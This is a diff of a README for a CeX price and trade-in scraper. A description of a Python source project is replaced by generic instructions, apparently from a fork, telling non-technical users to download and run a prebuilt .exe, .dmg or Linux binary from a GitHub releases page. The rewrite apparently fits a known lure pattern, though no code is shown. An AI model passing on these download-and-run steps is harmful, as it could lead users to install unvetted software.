@@ -1,186 +1,102 @@
-# Cex Product Scraper (uk.webuy.com)
-> A specialized scraper designed to extract structured product data from CeX (uk.webuy.com), helping users access accurate pricing, stock status, and trade-in values in real time. This tool streamlines product research and competitive analysis by automating data collection across CeX listings.
+# 🛍️ cex-product-scraper-uk-webuy-com - Easily Extract cex Product Data
 
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Raghadad04/cex-product-scraper-uk-webuy-com/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📖 Overview
 
+The **cex-product-scraper-uk-webuy-com** is a simple tool designed to help users extract product data from CEX using the UK Webuy website. Whether you want to track prices, gather product details, or analyze competition, this application makes it easy and accessible—even for those without technical skills.
 
+## 🚀 Getting Started
 
+To begin, follow these steps to download and run the software:
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>cex-product-scraper-uk-webuy-com</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page:  
+   [Download Now](https://github.com/Raghadad04/cex-product-scraper-uk-webuy-com/releases)
 
+2. **Download the Latest Version**  
+   On the releases page, look for the latest version. Click the download link for the appropriate file format for your operating system.
 
-## Introduction
-This project retrieves detailed product information from CeX, including pricing, stock availability, trade-in values, and product metadata. It eliminates manual research by automating searches across CeX catalog pages using keywords or direct URLs.
-It is ideal for e-commerce teams, market researchers, resellers, and data analysts needing reliable CeX product insights at scale.
+3. **Install the Software**  
+   After downloading the file, follow the steps below to install it based on your operating system.
 
-### Smart Product Intelligence
-- Automates targeted searches using keywords, URLs, or bulk lists.
-- Extracts accurate, real-time pricing and trade-in data.
-- Supports optional filters such as price ranges and maximum result count.
-- Uses robust request handling and retry logic for reliability.
-- Produces clean, analysis-ready JSON outputs.
+## 🖥️ Installation Instructions
 
-## Features
-| Feature | Description |
-|--------|-------------|
-| Multi-Format Input | Accepts keywords, direct URLs, or comma-separated bulk queries. |
-| Price Range Filters | Filter listings by minimum and maximum price for precision results. |
-| Rich Data Extraction | Retrieves titles, prices, stock status, images, URLs, and trade-in values. |
-| Anti-Detection Handling | Implements stealth routing, error recovery, and session rotation. |
-| Configurable Limits | Set max items per keyword to control dataset size. |
-| Optional Fields | Toggle images, stock data, and trade-in values on/off. |
-| Parallel Processing | Adjustable concurrency for faster scraping. |
-| Export-Friendly Output | Produces clean, structured JSON for analytics or integrations. |
+### Windows
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| title | The full product title as displayed on CeX. |
-| price | Current selling price in GBP. |
-| image | High-quality product image URL (optional). |
-| productUrl | Direct link to the product page. |
-| stock_status | Real-time availability information. |
-| trade_in_voucher | Voucher trade-in value from CeX. |
-| trade_in_cash | Cash trade-in value from CeX. |
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run it.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can run the application from the Start Menu or the desktop shortcut.
 
----
-## Example Output
+### macOS
 
+1. Find the `.dmg` file you downloaded.
+2. Double-click to open it.
+3. Drag the application into your Applications folder.
+4. After you've moved it, you can open it from your Applications folder.
 
-    {
-        "title": "Apple iPhone 15 Pro 128GB Natural Titanium",
-        "price": "£899.00",
-        "image": "https://uk.webuy.com/product-images/sample.jpg",
-        "productUrl": "https://uk.webuy.com/product-detail/sample",
-        "stock_status": "In stock online",
-        "trade_in_voucher": "£650.00",
-        "trade_in_cash": "£520.00"
-    }
+### Linux
 
----
-## Directory Structure Tree
+1. Open a terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the command `chmod +x yourfile` to make it executable, replacing `yourfile` with the actual file name.
+4. Run the application by typing `./yourfile` in the terminal.
 
+## 🌟 Features
 
-    Cex Product Scraper (uk.webuy.com)/
-    ├── src/
-    │   ├── runner.py
-    │   ├── extractors/
-    │   │   ├── cex_parser.py
-    │   │   └── utils_format.py
-    │   ├── outputs/
-    │   │   └── exporters.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.txt
-    │   └── sample.json
-    ├── requirements.txt
-    └── README.md
+- **Product Price Tracking**: Keep an eye on price changes for your favorite products.
+- **Data Extraction**: Gather detailed information about products in one go.
+- **Competitive Analysis**: Compare your product offerings with competitors.
+- **User-Friendly Interface**: Navigate easily, even if you lack technical skills.
 
----
-## Use Cases
-- **E-commerce resellers** use it to monitor CeX prices so they can adjust buying and selling strategies for maximum profit.
-- **Market research teams** use it to study pricing patterns, stock trends, and second-hand electronics demand.
-- **Inventory managers** use it to track fluctuating trade-in values for smarter procurement decisions.
-- **Price intelligence platforms** integrate it to enrich dashboards with real-time CeX product metrics.
-- **Data analysts** use it to generate competitive insights and build product comparison models.
+## ⚙️ System Requirements
 
----
-## FAQs
+Before you install, ensure your system meets these requirements:
 
-**Q: Can this scraper handle multiple keywords at once?**
-Yes, you can pass comma-separated queries to extract data for several product types in a single run.
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Any Linux distribution with support for `.deb` and `.rpm` packages
 
-**Q: Does it support direct URL scraping?**
-Absolutely — paste any CeX search URL to extract products directly from that search page.
+- **Storage**: At least 100 MB of free space
+- **RAM**: Minimum 2 GB
+  
+## 📊 How to Use the Application
 
-**Q: Are images or trade-in values required?**
-No, these fields are optional and can be toggled off for faster runs.
+1. **Open the Application**  
+   After installation, launch the application.
 
-**Q: How accurate is the pricing information?**
-Prices are fetched in real time and validated through structured parsing to maintain high data consistency.
+2. **Enter Product URL**  
+   Input the URL of the CEX product you want to analyze in the designated field.
 
----
-### Performance Benchmarks and Results
+3. **Start Scraping**  
+   Click the "Scrape" button. The app will gather data and display it in an easy-to-read format.
 
-**Primary Metric:** Typical workload of 10–20 items completes in under 3 minutes with default settings.
+4. **Export Data**  
+   If you wish to keep a record, click the "Export" button to save the data in a text or CSV file.
 
-**Reliability Metric:** Over 98% successful retrieval rate achieved under varied network conditions due to retry logic and adaptive request handling.
+## 📌 FAQs
 
-**Efficiency Metric:** Processes up to 3 parallel requests with minimal overhead, enabling smooth scaling for bulk searches.
+### What data can I extract using this tool?
 
-**Quality Metric:** Extracted data consistently shows >95% field completeness across titles, prices, availability, and trade-in values.
+You can extract various information, including product names, prices, availability, and descriptions.
 
----
+### Is there a limit to the number of products I can scrape?
 
+The application does not impose a limit; however, be mindful of the website's terms to avoid any restrictions.
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+### How often do you update the software?
+
+We regularly update the application to improve functionality and add new features. Always check the releases page for the latest updates.
+
+## 📥 Download & Install
+
+To download the application, visit this page once more:  
+[Download Now](https://github.com/Raghadad04/cex-product-scraper-uk-webuy-com/releases)
+
+Use the steps provided to install and run the software in just a few minutes.
+
+## 💬 Support
+
+If you have questions or need help, please reach out through the GitHub issues page. We strive to respond promptly to any inquiries.
